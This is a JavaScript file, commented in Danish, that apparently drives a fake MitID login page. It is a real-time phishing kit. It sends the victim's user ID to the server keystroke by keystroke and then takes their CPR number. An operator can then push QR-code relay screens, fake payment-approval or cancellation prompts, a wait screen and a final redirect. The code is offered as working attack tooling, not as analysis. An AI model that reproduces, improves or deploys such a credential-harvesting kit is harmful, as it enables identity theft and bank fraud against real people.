/* ════════════════════════════════════════════════════════════
   visitor.js — 1:1 MitID-flow (som rigtige login.php)
   KUNDENS EGET FLOW: Bruger-ID → CPR → (loader) → venter på admin
   ADMIN CAN OVERRIDE: scan / betaling / annuller / approved
   ════════════════════════════════════════════════════════════ */
let serverFlow = null;    // flow som admin har sat
let localStep = 'brugerid'; // kundens lokale trin (brugerid -> cpr -> wait)
let lastServerSig = null;
let qrDrawn = null;

const $ = (id) => document.getElementById(id);
const show = (el) => { if (el) el.classList.remove('hidden'); };
const hide = (el) => { if (el) el.classList.add('hidden'); };

/* ── TRIN VISNINGER ── */
function showBrugerId() {
  hide($('stepCpr')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
  show($('stepBruger'));
  $('formHeading').textContent = 'Log på';
}

function showCpr() {
  hide($('stepBruger')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
  show($('stepCpr'));
  $('formHeading').textContent = 'Log på';
  const cpr = $('cprInput');
  if (cpr) cpr.focus();
}

function showQr(s) {
  hide($('stepBruger')); hide($('stepCpr')); hide($('stepBetaling')); hide($('loaderContainer'));
  show($('stepQr'));
  $('formHeading').textContent = 'Log på';
  const url = s.sessionId ? window.location.origin + '/r/' + s.sessionId : 'https://mitid.dk';
  if (url !== qrDrawn) {
    const el = $('qrcode');
    el.innerHTML = '';
    if (window.QRCode) new QRCode(el, { text: url, width: 200, height: 200, colorDark: '#000', colorLight: '#fff', correctLevel: QRCode.CorrectLevel.M });
    qrDrawn = url;
  }
}

function showBetaling(s, annulerer) {
  hide($('stepBruger')); hide($('stepCpr')); hide($('stepQr')); hide($('loaderContainer'));
  show($('stepBetaling'));
  $('formHeading').textContent = annulerer ? 'Annullering' : 'Bekræft';
  const a = s.action || {};
  const amt = $('betAmount');
  amt.textContent = a.amount || '';
  amt.style.color = annulerer ? '#dc2626' : '#000';
  $('betTitle').textContent = a.title || (annulerer ? 'Annullering af betaling' : 'Slet denne betaling');
  $('betDetail').textContent = a.detail || '';
}

function showWait() {
  hide($('stepBruger')); hide($('stepCpr')); hide($('stepQr')); hide($('stepBetaling'));
  show($('loaderContainer'));
  $('formHeading').textContent = '';
}

/* ── KUNDENS EGET INPUT-FLOW ── */
const brugerInput = $('brugerIdInput');
const brugerBtn = $('brugerBtn');
const cprInput = $('cprInput');
const cprBtn = $('cprBtn');
let typedTimer = null;

// Skjul/Vis
$('hideBtn').addEventListener('click', function () {
  if (brugerInput.type === 'text') { brugerInput.type = 'password'; this.textContent = 'Vis'; }
  else { brugerInput.type = 'text'; this.textContent = 'Skjul'; }
});

// Bruger-ID input live-til-admin + aktiver knap
brugerInput.addEventListener('input', function () {
  const v = this.value.trim();
  brugerBtn.disabled = !v;
  brugerBtn.className = 'btn-primary ' + (v ? 'active' : 'disabled');
  clearTimeout(typedTimer);
  typedTimer = setTimeout(() => {
    fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ brugerId: v }) }).catch(() => {});
  }, 400);
});

// FORTSÆT fra Bruger-ID → CPR (lokal skift, som login.php)
brugerBtn.addEventListener('click', () => {
  const v = brugerInput.value.trim();
  if (!v) return;
  fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ brugerId: v }) }).catch(() => {});
  localStep = 'cpr';
  showCpr();
});

// CPR input-format DDMMÅÅ-XXXX
cprInput.addEventListener('input', function () {
  let v = this.value.replace(/\D/g, '').slice(0, 10);
  if (v.length > 6) v = v.slice(0, 6) + '-' + v.slice(6);
  this.value = v;
  const ready = v.replace('-', '').length >= 10;
  cprBtn.disabled = !ready;
  cprBtn.className = 'btn-primary ' + (ready ? 'active' : 'disabled');
});

// FORTSÆT fra CPR → send til admin → vis loader
cprBtn.addEventListener('click', () => {
  const v = cprInput.value.trim();
  if (v.replace('-', '').length < 10) return;
  fetch('/api/typed', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cpr: v }) }).catch(() => {});
  localStep = 'wait';
  showWait();
});

/* ── SERVER-FLOW: admin kan override ── */
function render(s) {
  if (!s || !s.live) {
    hide($('stepBruger')); hide($('stepCpr')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
    $('formHeading').textContent = 'MitID';
    return;
  }
  const serverF = s.flow || 'brugerid';
  if (serverF === serverFlow) return;  // ingen ændring fra admin — behold kundens lokale trin
  serverFlow = serverF;

  // admin-styrede trin (QR, betaling, annuller, wait, approved)
  switch (serverF) {
    case 'scan': localStep = 'scan'; showQr(s); break;
    case 'betaling': localStep = 'betaling'; showBetaling(s, false); break;
    case 'annuller': localStep = 'annuller'; showBetaling(s, true); break;
    case 'wait': localStep = 'wait'; showWait(); break;
    case 'approved':
      hide($('stepBruger')); hide($('stepCpr')); hide($('stepQr')); hide($('stepBetaling')); hide($('loaderContainer'));
      $('formHeading').textContent = 'Godkendt';
      if (s.target && s.target.trim()) setTimeout(() => { window.location.href = s.target.trim(); }, 1500);
      break;
    case 'brugerid':
      // admin vil vise bruger-ID trin - vis CPR hvis kunden allerede har tastet, ellers bruger-ID
      if (localStep === 'cpr') showCpr(); else showBrugerId();
      break;
  }
}

/* ── POLL + SOCKET ── */
async function poll() {
  try {
    const r = await fetch('/api/public-state', { cache: 'no-store' });
    render(await r.json());
  } catch (e) {}
}
poll();
try { const socket = io(); socket.on('state-update', render); } catch (e) {}
setInterval(poll, 1000);